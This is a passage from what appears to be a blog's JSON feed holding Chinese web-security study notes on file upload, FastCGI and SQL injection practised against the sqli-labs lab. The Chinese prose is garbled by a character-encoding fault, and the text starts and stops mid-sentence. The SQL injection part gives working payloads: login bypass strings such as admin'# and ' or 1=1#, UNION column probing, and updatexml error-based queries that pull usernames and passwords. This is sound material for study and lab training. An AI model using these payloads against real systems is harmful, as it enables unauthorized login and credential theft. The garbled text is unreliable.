ä¸­ï¼Œä¸€èˆ¬æ˜¯ä¸“é—¨æœ‰ä¸€ä¸ªç›®å½•ç”¨æ¥å­˜åœ¨å›¾ç‰‡ï¼Œå¯èƒ½å°æ¦‚ç‡ä¼šå­˜åœ¨.php æ–‡ä»¶ã€‚ä½†æ˜¯æœ‰æ—¶å¯ä»¥ä½¿ç”¨  <code>../</code>  æ¥å°†æ–‡ä»¶ä¸Šä¼ åˆ°å…¶ä»–ç›®å½•ï¼Œè¾¾åˆ°ä¸€ä¸ªåˆ©ç”¨çš„æ•ˆæœã€‚ï¼‰ä¸¥æ ¼é™åˆ¶æ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„</p>\n<p>å†è€…ç»“æŸå¯¹ ini æ‰©å±•åçš„è¿‡æ»¤ï¼Œå¯¹æ–‡ä»¶å†…å®¹ auto_prepend_fileã€auto_append_file çš„è¿‡æ»¤</p>\n<h3 id=\"è¡¥å……\"><a class=\"anchor\" href=\"#è¡¥å……\">#</a> è¡¥å……</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022150904047.png\" alt=\"image-20221022150904047\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022150917949.png\" alt=\"image-20221022150917949\" /></p>\n<p>äº†è§£ä»€ä¹ˆæ˜¯ FastCGIï¼Œé¦–å…ˆåº”è¯¥çŸ¥é“ä»€ä¹ˆæ˜¯ cgi</p>\n<p>å…¨ç§°æ˜¯ â€œé€šç”¨ç½‘å…³æ¥å£â€ï¼Œæ˜¯ä¸€ç§è®©å®¢æˆ·ç«¯ï¼ˆweb æµè§ˆå™¨ï¼‰ä¸ Web æœåŠ¡å™¨ï¼ˆapacheï¼Œnginx ç­‰ï¼‰ç¨‹åºè¿›è¡Œé€šä¿¡ï¼ˆæ•°æ®ä¼ è¾“ï¼‰çš„åè®®ã€‚</p>\n<h5 id=\"cgiå·¥ä½œæµç¨‹\"><a class=\"anchor\" href=\"#cgiå·¥ä½œæµç¨‹\">#</a> CGI å·¥ä½œæµç¨‹</h5>\n<ol>\n<li>æ¯æ¬¡å½“ web server æ”¶åˆ° index.php è¿™ç§ç±»å‹çš„åŠ¨æ€è¯·æ±‚åï¼Œä¼šå¯åŠ¨å¯¹åº”çš„ CGI ç¨‹åº - PHP çš„è§£æå™¨ï¼›</li>\n<li>PHP è§£æå™¨ä¼šè§£æ php.ini é…ç½®æ–‡ä»¶ï¼Œåˆå§‹åŒ–è¿è¡Œç¯å¢ƒï¼Œç„¶åå¤„ç†è¯·æ±‚ï¼Œå¤„ç†å®Œæˆåå°†æ•°æ®æŒ‰ç…§ CGI è§„å®šçš„æ ¼å¼è¿”å›ç»™ web server ç„¶åé€€å‡ºè¿›ç¨‹ï¼›</li>\n<li>æœ€å web server å†æŠŠç»“æœè¿”å›ç»™æµè§ˆå™¨ã€‚</li>\n</ol>\n<p>é«˜å¹¶å‘æ—¶çš„æ€§èƒ½è¾ƒå·®ï¼š<br />\nCGI ç¨‹åºçš„æ¯ä¸€æ¬¡ web è¯·æ±‚éƒ½ä¼šæœ‰å¯åŠ¨å’Œé€€å‡ºè¿‡ç¨‹ â€”â€” æ¯æ¬¡ HTTP æœåŠ¡å™¨é‡åˆ°åŠ¨æ€è¯·æ±‚æ—¶éƒ½éœ€è¦é‡æ–°å¯åŠ¨è„šæœ¬è§£æå™¨æ¥è§£æ php.iniï¼Œé‡æ–°è½½å…¥å…¨éƒ¨ DLL æ‰©å±•å¹¶é‡åˆå§‹åŒ–å…¨éƒ¨æ•°æ®ç»“æ„ï¼Œç„¶åæŠŠç»“æœè¿”å›ç»™ HTTP æœåŠ¡å™¨</p>\n<h5 id=\"fastcgi\"><a class=\"anchor\" href=\"#fastcgi\">#</a> FastCGI</h5>\n<p>å›  CGI é«˜å¹¶å‘æ—¶æ€§èƒ½å·®ï¼Œæœªè§£å†³è¿™ä¸€é—®é¢˜äº§ç”Ÿäº† FastCGI</p>\n<h5 id=\"fastcgiå·¥ä½œæµç¨‹\"><a class=\"anchor\" href=\"#fastcgiå·¥ä½œæµç¨‹\">#</a> FastCGI å·¥ä½œæµç¨‹</h5>\n<ol>\n<li>Web Server å¯åŠ¨åŒæ—¶ï¼ŒåŠ è½½ FastCGI è¿›ç¨‹ç®¡ç†å™¨</li>\n<li>FastCGI è¿›ç¨‹ç®¡ç†å™¨è¯»å– php.ini é…ç½®æ–‡ä»¶ï¼Œå¯¹è‡ªèº«è¿›è¡Œåˆå§‹åŒ–ï¼Œå¯åŠ¨å¤šä¸ª CGI è§£é‡Šå™¨è¿›ç¨‹ (php-cgi)ï¼Œç­‰å¾…æ¥è‡ª Web Server çš„è¿æ¥ã€‚</li>\n<li>å½“ Web Server æ¥æ”¶åˆ°å®¢æˆ·ç«¯è¯·æ±‚æ—¶ï¼ŒFastCGI è¿›ç¨‹ç®¡ç†å™¨é€‰æ‹©å¹¶è¿æ¥åˆ°ä¸€ä¸ª CGI è§£é‡Šå™¨ã€‚Web server ä¼šå°†ç›¸å…³ç¯å¢ƒå˜é‡å’Œæ ‡å‡†è¾“å…¥å‘é€åˆ° FastCGI å­è¿›ç¨‹ php-cgi è¿›è¡Œå¤„ç†</li>\n<li>FastCGI å­è¿›ç¨‹å®Œæˆå¤„ç†åå°†æ•°æ®æŒ‰ç…§ CGI è§„å®šçš„æ ¼å¼è¿”å›ç»™ Web Serverï¼Œç„¶åå…³é—­ FastCGI å­è¿›ç¨‹æˆ–è€…ç­‰å¾…ä¸‹ä¸€æ¬¡è¯·æ±‚ã€‚</li>\n</ol>\n<h5 id=\"fastcgiè§£å†³æ–¹æ¡ˆ\"><a class=\"anchor\" href=\"#fastcgiè§£å†³æ–¹æ¡ˆ\">#</a> FastCGI è§£å†³æ–¹æ¡ˆ</h5>\n<p>Master-Worker æ¨¡å¼</p>\n<p>Fastcgi ä¼šå…ˆå¯ä¸€ä¸ª masterï¼Œè§£æé…ç½®æ–‡ä»¶ï¼Œåˆå§‹åŒ–æ‰§è¡Œç¯å¢ƒï¼Œç„¶åå†å¯åŠ¨å¤šä¸ª workerã€‚å½“è¯·æ±‚è¿‡æ¥æ—¶ï¼Œmaster ä¼šä¼ é€’ç»™ä¸€ä¸ª workerï¼Œç„¶åç«‹å³å¯ä»¥æ¥å—ä¸‹ä¸€ä¸ªè¯·æ±‚ã€‚è¿™æ ·å°±é¿å…äº†é‡å¤çš„åŠ³åŠ¨ï¼Œæ•ˆç‡è‡ªç„¶æé«˜ã€‚è€Œä¸”å½“ worker ä¸å¤Ÿç”¨æ—¶ï¼Œmaster å¯ä»¥æ ¹æ®é…ç½®é¢„å…ˆå¯åŠ¨å‡ ä¸ª worker ç­‰ç€ï¼›å½“ç„¶ç©ºé—² worker å¤ªå¤šæ—¶ï¼Œä¹Ÿä¼šåœæ‰ä¸€äº›ï¼Œè¿™æ ·å°±æé«˜äº†æ€§èƒ½ï¼Œä¹ŸèŠ‚çº¦äº†èµ„æºã€‚è¿™å°±æ˜¯ fastcgi çš„å¯¹è¿›ç¨‹çš„ç®¡ç†ã€‚</p>\n",
            "tags": [
                "Web",
                "æ–‡ä»¶ä¸Šä¼ "
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/sql%E6%B3%A8%E5%85%A5/",
            "url": "https://blog.xcu.icu/2022/10/24/sql%E6%B3%A8%E5%85%A5/",
            "title": "SQLæ³¨å…¥",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<h2 id=\"ä»€ä¹ˆæ˜¯sqlæ³¨å…¥\"><a class=\"anchor\" href=\"#ä»€ä¹ˆæ˜¯sqlæ³¨å…¥\">#</a> ä»€ä¹ˆæ˜¯ sql æ³¨å…¥</h2>\n<p>å­¦ä¸€ä¸ªæ¼æ´æˆ‘ä»¬åº”è¯¥çŸ¥é“ï¼Œæ¼æ´çš„å±å®³ï¼Œæˆå› ã€åŸç†ã€æ”»å‡»æ–¹å¼ï¼Œä»¥åŠé˜²å¾¡æ–¹å¼ã€‚æ‰€ä»¥è¿™é‡Œé¦–å…ˆèŠä¸€èŠä»€ä¹ˆæ˜¯ sql æ³¨å…¥ï¼ŒSQL æ³¨å…¥åˆ†ç±»äº web å®‰å…¨æ¼æ´ï¼Œé€šè¿‡ sql æ³¨å…¥æ”»å‡»è€…å¯ä»¥å¹²æ‰°åº”ç”¨ç¨‹åºå¯¹å…¶æ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢ã€‚å®ƒé€šå¸¸å…è®¸æ”»å‡»è€…æŸ¥çœ‹ä»–ä»¬æ­£å¸¸æ— æ³•æ£€ç´¢åˆ°çš„æ•°æ®ã€‚è®¸å¤šæƒ…å†µä¸‹æ”»å‡»è€…å¯ä»¥å¯¹æ•°æ®åº“è¿›è¡Œå¢åˆ æ”¹æŸ¥çš„æ“ä½œ</p>\n<h2 id=\"sqlæ³¨å…¥çš„å±å®³\"><a class=\"anchor\" href=\"#sqlæ³¨å…¥çš„å±å®³\">#</a> sql æ³¨å…¥çš„å±å®³</h2>\n<p>å‰é¢è¯´å®Œäº†ä»€ä¹ˆæ˜¯ sql æ³¨å…¥ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬èŠä¸€èŠ sql æ³¨å…¥æ¼æ´é€ æˆçš„å±å®³ï¼Œsql æ³¨å…¥æˆåŠŸåæˆ‘ä»¬ä¸ä»…å¯ä»¥åƒä¸Šé¢æåˆ°æ˜¯é‚£æ ·å¯¹å„ç§æ•°æ®è¿›è¡Œå¢åˆ æ”¹æŸ¥ï¼Œå¦‚æœç½‘ç«™ç›®å½•å­˜åœ¨å†™å…¥æƒé™æˆ‘ä»¬å¯ä»¥å†™å…¥ç½‘é¡µæœ¨é©¬ã€‚æ”»å‡»è€…è¿›è€Œå¯ä»¥å¯¹ç½‘é¡µè¿›è¡Œç¯¡æ”¹ï¼Œå‘å¸ƒä¸€äº›è¿æ³•ä¿¡æ¯ç­‰ï¼Œç”šè‡³å¯ä»¥é€šè¿‡ææƒç­‰æ“ä½œè·å–æœåŠ¡å™¨æœ€é«˜æƒé™æ¥è¿œç¨‹æ§åˆ¶æœåŠ¡å™¨ï¼Œå®‰è£…åé—¨ï¼Œä¿®æ”¹æˆ–è€…æ§åˆ¶æ“ä½œç³»ç»Ÿ</p>\n<h2 id=\"sqlæ³¨å…¥çš„æˆå› \"><a class=\"anchor\" href=\"#sqlæ³¨å…¥çš„æˆå› \">#</a> sql æ³¨å…¥çš„æˆå› </h2>\n<p>sql æ¼æ´çš„æˆå› å¾ˆç®€å•ï¼Œå°±æ˜¯å¼€å‘è¿‡ç¨‹æ²¡æœ‰å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ï¼Œå¼€å‘äººå‘˜è¿èƒŒäº† â€œä»£ç ä¸æ•°æ®åˆ†ç¦»â€ åŸåˆ™ã€‚ä¸€æ–¹é¢ï¼Œæ”»å‡»è€…å¯ä»¥ä»»æ„æ›´æ”¹è¾“å…¥æ•°æ®ï¼›å¦ä¸€æ–¹é¢ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æ•°æ®é‡Œæ„é€ ä»£ç ï¼Œè®©æœåŠ¡å™¨ç«¯æŠŠæ•°æ®è§£ææˆä»£ç æ‰§è¡Œã€‚æ”»å‡»è€…é€šè¿‡æŠŠ SQL å‘½ä»¤æ’å…¥åˆ° Web è¡¨å•é€’äº¤æˆ–è¾“å…¥åŸŸåæˆ–é¡µé¢è¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œæœ€ç»ˆè¾¾åˆ°æ¬ºéª—æœåŠ¡å™¨æ‰§è¡Œæ¶æ„çš„ SQL å‘½ä»¤ã€‚</p>\n<h2 id=\"sqlæ³¨å…¥çš„åˆ†ç±»\"><a class=\"anchor\" href=\"#sqlæ³¨å…¥çš„åˆ†ç±»\">#</a> SQL æ³¨å…¥çš„åˆ†ç±»</h2>\n<h3 id=\"æœ‰å›æ˜¾çš„æ³¨å…¥\"><a class=\"anchor\" href=\"#æœ‰å›æ˜¾çš„æ³¨å…¥\">#</a> æœ‰å›æ˜¾çš„æ³¨å…¥</h3>\n<ol>\n<li>è”åˆæŸ¥è¯¢</li>\n<li>æŠ¥é”™æ³¨å…¥</li>\n<li>é€šè¿‡æ³¨å…¥è¿›è¡Œ DNS è¯·æ±‚ï¼Œè¾¾åˆ°å›æ˜¾çš„ç›®çš„</li>\n</ol>\n<h3 id=\"æ— å›æ˜¾çš„æ³¨å…¥\"><a class=\"anchor\" href=\"#æ— å›æ˜¾çš„æ³¨å…¥\">#</a> æ— å›æ˜¾çš„æ³¨å…¥</h3>\n<ol>\n<li>Bool ç›²æ³¨</li>\n<li>æ—¶é—´ç›²æ³¨</li>\n</ol>\n<h3 id=\"äºŒæ¬¡æ³¨å…¥\"><a class=\"anchor\" href=\"#äºŒæ¬¡æ³¨å…¥\">#</a> äºŒæ¬¡æ³¨å…¥</h3>\n<p>ä¸€ç§ä¸šåŠ¡é€»è¾‘å¤æ‚çš„é¢˜ç›®ï¼Œä¸€èˆ¬éœ€è¦è‡ªå·±ç¼–å†™è„šæœ¬æ¥å®ç°è‡ªåŠ¨åŒ–æ³¨å…¥</p>\n<h2 id=\"whereå­å¥çš„sqlæ³¨å…¥æ¼æ´\"><a class=\"anchor\" href=\"#whereå­å¥çš„sqlæ³¨å…¥æ¼æ´\">#</a> where å­å¥çš„ sql æ³¨å…¥æ¼æ´</h2>\n<p>æœ¬ç¬”è®°åŸºäº sql-labs é¶åœºè®°å½•</p>\n<p>sql-labs ç¬¬ä¸€å…³</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token string double-quoted-string\">\"SELECT * FROM users WHERE id='<span class=\"token interpolation\"><span class=\"token variable\">$id</span></span>' LIMIT 0,1\"</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<ul>\n<li>æ‰€æœ‰è¯¦ç»†ä¿¡æ¯ï¼ˆ*ï¼‰</li>\n<li>ä» users è¡¨ä¸­</li>\n<li>å…¶ä¸­ç±»åˆ«æ˜¯ id</li>\n<li>limit 0,1 è¡¨ç¤ºçš„æ˜¯ä»ç¬¬ä¸€æ¡è®°å½•å¼€å§‹ï¼Œåªå–ä¸€æ¡</li>\n</ul>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>è¿™é‡Œä¼šå°† sql æŸ¥è¯¢çš„ç»“æœè¿”å›ï¼Œè¿™ä¸€å…³å¹¶æ²¡æœ‰è¿›è¡Œä»»ä½•çš„è¿‡æ»¤ï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥æ„å»º</p>\n<p><pre class=\"line-numbers language-payload\" data-language=\"payload\"><code class=\"language-payload\">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39;--<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220925110237019.png\" alt=\"image-20220925110237019\" /></p>\n<p>è¿™é‡Œçš„å…³é”®æ˜¯ä¸¤ä¸ªå‡å·åœ¨ SQL ä¸­æ˜¯æ³¨é‡ŠæŒ‡ç¤ºç¬¦ï¼Œæ„å‘³ç€æŸ¥è¯¢çš„å…¶ä½™éƒ¨åˆ†è¢«è§£é‡Šä¸ºæ³¨é‡Šã€‚è¿™å°†ä½¿å¾—åŸæœ‰çš„è¯­å¥åéƒ¨åˆ†æ— æ³•è¢«åŒ…å«ï¼Œä¹Ÿå°±å¯ä»¥çªç ´ limit 0,1 çš„é™åˆ¶æŸ¥è¯¢åˆ°æ‰€æœ‰çš„æ•°æ®</p>\n<h3 id=\"é¢ è¦†åº”ç”¨é€»è¾‘\"><a class=\"anchor\" href=\"#é¢ è¦†åº”ç”¨é€»è¾‘\">#</a> é¢ è¦†åº”ç”¨é€»è¾‘</h3>\n<p>sql-labs ç¬¬ 11 å…³</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$sql</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"SELECT * FROM users WHERE username='<span class=\"token interpolation\"><span class=\"token variable\">$uname</span></span>' and password='<span class=\"token interpolation\"><span class=\"token variable\">$passwd</span></span>' LIMIT 0,1\"</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œåˆ¤æ–­ç”¨æˆ·è¾“å…¥åœ¨æ•°æ®åº“ä¸­èƒ½ä¸èƒ½æŸ¥è¯¢åˆ°ï¼Œå¦‚æœæŸ¥è¯¢åˆ°åˆ™ç™»å½•ï¼ŒæŸ¥è¯¢ä¸åˆ°è¿™åˆ™æ‹’ç»ï¼Œè¿™é‡Œæ”»å‡»è€…åªéœ€è¦ä½¿ç”¨ SQL æ³¨é‡Šå°†å¯†ç çš„åˆ¤æ–­æ³¨é‡Šæ‰è¿™å¯ä»¥ç›´æ¥ç”¨ç”¨æˆ·åç™»å½•<br />\nå¦‚è¿™é‡Œæœ‰ä¸€ä¸ª admin ç”¨æˆ·åªéœ€è¦åœ¨ç”¨æˆ·åå¤„è¾“å…¥ admin'# å³å¯ç™»å½•</p>\n<p><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> users <span class=\"token keyword\">WHERE</span> username<span class=\"token operator\">=</span><span class=\"token string\">'admin'</span><span class=\"token comment\">#' and password='' LIMIT 0,1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>è¿™æ—¶åªåˆ¤æ–­äº† admin æ˜¯å¦å­˜åœ¨ï¼Œä½†æ˜¯è¿™é‡Œè¿˜éœ€è¦çŸ¥é“ç”¨æˆ·åï¼Œæœ‰æ²¡æœ‰ä¸€ç§æ–¹æ³•ä¸ç”¨ç”¨æˆ·åä¹Ÿèƒ½ç™»å½•å‘¢ï¼Œæœ‰çš„</p>\n<p>æˆ‘ä»¬ä½¿ç”¨ä¸Šé¢æœ‰ç”¨åˆ°çš„ or</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220925113956855.png\" alt=\"image-20220925113956855\" /></p>\n<p><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> users <span class=\"token keyword\">WHERE</span> username<span class=\"token operator\">=</span><span class=\"token string\">'1'</span> <span class=\"token operator\">or</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token comment\">#' and password='' LIMIT 0,1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>è¿™é‡Œ or æ˜¯å¹¶è¿ç®—ï¼Œé‚£ä¹ˆå‰ååªéœ€è¦æˆç«‹ä¸€ä¸ªä¾¿å¯<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220925114457385.png\" alt=\"image-20220925114457385\" /></p>\n<p>è¿™é‡Œæ˜¯å¯ä»¥æ‰§è¡ŒæˆåŠŸçš„</p>\n<h2 id=\"è”åˆæŸ¥è¯¢çš„sqlæ³¨å…¥\"><a class=\"anchor\" href=\"#è”åˆæŸ¥è¯¢çš„sqlæ³¨å…¥\">#</a> è”åˆæŸ¥è¯¢çš„ SQL æ³¨å…¥</h2>\n<p>å½“åº”ç”¨ç¨‹åºå®¹æ˜“å—åˆ° SQL æ³¨å…¥çš„æ”»å‡»ï¼Œå¹¶ä¸”åœ¨åº”ç”¨ç¨‹åºçš„å“åº”ä¸­è¿”å›æŸ¥è¯¢ç»“æœæ—¶ï¼Œå¯ä»¥ä½¿ç”¨å…³é”®å­—ä»æ•°æ®åº“ä¸­çš„å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®ã€‚è¿™ä¼šå¯¼è‡´ SQL æ³¨å…¥è”åˆæ”»å‡»ã€‚<em><strong>UNION</strong></em> è¯¥å…³é”®å­—å…è®¸æ‚¨æ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªé™„åŠ æŸ¥è¯¢ï¼Œå¹¶å°†ç»“æœè¿½åŠ åˆ°åŸå§‹æŸ¥è¯¢</p>\n<p>ä½¿ç”¨ UNION éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶</p>\n<ol>\n<li>å„ä¸ªæŸ¥è¯¢å¿…é¡»è¿”å›ç›¸åŒæ•°é‡çš„åˆ—ã€‚</li>\n<li>æ¯åˆ—ä¸­çš„æ•°æ®ç±»å‹å¿…é¡»åœ¨å„ä¸ªæŸ¥è¯¢ä¹‹é—´å…¼å®¹ã€‚</li>\n</ol>\n<h3 id=\"ç¡®å®šsqlæ³¨å…¥æ”»å‡»ä¸­æ‰€éœ€è¦çš„åˆ—æ•°\"><a class=\"anchor\" href=\"#ç¡®å®šsqlæ³¨å…¥æ”»å‡»ä¸­æ‰€éœ€è¦çš„åˆ—æ•°\">#</a> ç¡®å®š SQL æ³¨å…¥æ”»å‡»ä¸­æ‰€éœ€è¦çš„åˆ—æ•°</h3>\n<p>æœ‰ä¸¤ä¸ªæ–¹æ³•å¯ä»¥åˆ¤æ–­</p>\n<p>ç¬¬ä¸€ç§æ–¹æ³•æ¶‰åŠæ³¨å…¥ä¸€ç³»åˆ—å­å¥å¹¶é€’å¢æŒ‡å®šçš„åˆ—ç´¢å¼•ï¼Œç›´åˆ°å‘ç”Ÿé”™è¯¯</p>\n<p><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token string\">' ORDER BY 1--\n'</span> <span class=\"token keyword\">ORDER</span> <span class=\"token keyword\">BY</span> <span class=\"token number\">2</span><span class=\"token comment\">--</span>\n' <span class=\"token keyword\">ORDER</span> <span class=\"token keyword\">BY</span> <span class=\"token number\">3</span><span class=\"token comment\">--</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre></p>\n<p>ç¬¬äºŒç§æ–¹æ³•æ¶‰åŠæäº¤ä¸€ç³»åˆ—æœ‰æ•ˆè´Ÿè½½ï¼ŒæŒ‡å®šä¸åŒæ•°é‡çš„ å€¼</p>\n<p><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token string\">' UNION SELECT NULL--\n'</span> <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token comment\">--</span>\n' <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token comment\">--</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre></p>\n<p>ä¸Šé¢éƒ½æ˜¯å½“åˆ—æ•°ä¸åŒ¹é…æ—¶ä¼šè¿”å›é”™è¯¯</p>\n<h3 id=\"æŸ¥æ‰¾å…·æœ‰æœ‰ç”¨æ•°æ®ç±»å‹çš„åˆ—\"><a class=\"anchor\" href=\"#æŸ¥æ‰¾å…·æœ‰æœ‰ç”¨æ•°æ®ç±»å‹çš„åˆ—\">#</a> æŸ¥æ‰¾å…·æœ‰æœ‰ç”¨æ•°æ®ç±»å‹çš„åˆ—</h3>\n<p>è¦æ£€ç´¢çš„ç›¸å…³æ•°æ®å°†é‡‡ç”¨å­—ç¬¦ä¸²å½¢å¼ï¼Œå› æ­¤æ‚¨éœ€è¦åœ¨åŸå§‹æŸ¥è¯¢ç»“æœä¸­æŸ¥æ‰¾æ•°æ®ç±»å‹ä¸ºå­—ç¬¦ä¸²æ•°æ®æˆ–ä¸å­—ç¬¦ä¸²æ•°æ®å…¼å®¹çš„ä¸€åˆ—æˆ–å¤šåˆ—ã€‚</p>\n<p><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token string\">' UNION SELECT '</span>a<span class=\"token string\">',NULL,NULL,NULL--\n'</span> <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token comment\">--</span>\n<span class=\"token string\">' UNION SELECT NULL,NULL,'</span>a<span class=\"token string\">',NULL--\n'</span> <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token comment\">--</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h2 id=\"æŠ¥é”™æ³¨å…¥\"><a class=\"anchor\" href=\"#æŠ¥é”™æ³¨å…¥\">#</a> æŠ¥é”™æ³¨å…¥</h2>\n<p>ä¸»è¦æ˜¯ä¸‰ç§æŠ¥é”™æ³¨å…¥çš„æ–¹å¼ï¼Œåˆ†åˆ«æ˜¯ updatexmlï¼Œfloor å’Œ exp</p>\n<h3 id=\"updatexml\"><a class=\"anchor\" href=\"#updatexml\">#</a> updatexml</h3>\n<p>åŸç†ä»æœ¬è´¨æ¥è¯´å°±æ˜¯å‡½æ•°çš„æŠ¥é”™</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221001004112785.png\" alt=\"image-20221001004112785\" /></p>\n<p><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> updatexml<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span>version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>è¿™é‡Œçš„ version æ›¿æ¢æˆæŸ¥è¯¢è¯­å¥å³å¯ï¼Œä¸‹é¢æ˜¯ä¸¤ä¸ªä¾‹å­</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">&#39;) and updatexml(1,concat(0x7e,database(),0x7e),1)#\n&#39;) and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users),0x7e),1)#<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<h3 id=\"floor\"><a class=\"anchor\" href=\"#floor\">#</a> floor</h3>\n<p><strong>å…³é”®å‡½æ•°ï¼š</strong><br />\n<strong>Rand () ------- äº§ç”Ÿ 0~1 çš„ä¼ªéšæœºæ•°</strong></p>\n<p><strong>rand æœ‰ä¸¤ç§å½¢å¼ï¼š</strong></p>\n<p><strong>1ã€rand (), å³æ— å‚æ•°çš„ï¼Œæ­¤æ—¶äº§ç”Ÿçš„éšæœºæ•°æ˜¯éšæœºçš„ï¼Œä¸å¯é‡å¤çš„ï¼›</strong></p>\n<p><strong>2ã€rand (n), å³æœ‰å‚æ•°æ•°ï¼Œå¦‚ rand (0), è¿™é‡Œ 0 ç›¸å½“äºç§å­ï¼Œé‚£ä¹ˆè¿™é‡Œä¼šäº§ç”Ÿä¸€åˆ—ä¼ªéšæœºæ•°ã€‚</strong></p>\n<p><strong>Floor () ------- å‘ä¸‹å–æ•´æ•°</strong><br />\n<strong> Concat () ----- è¿æ¥å­—ç¬¦ä¸²</strong><br />\n<strong> Count () ------ è®¡ç®—æ€»æ•°</strong></p>\n<p><strong>1ï¼Œcount(*)</strong></p>\n<p><strong>è¿”å›è¡¨ä¸­çš„è®°å½•æ•° (åŒ…æ‹¬æ‰€æœ‰åˆ—)ï¼Œç›¸å½“äºç»Ÿè®¡è¡¨çš„è¡Œæ•° 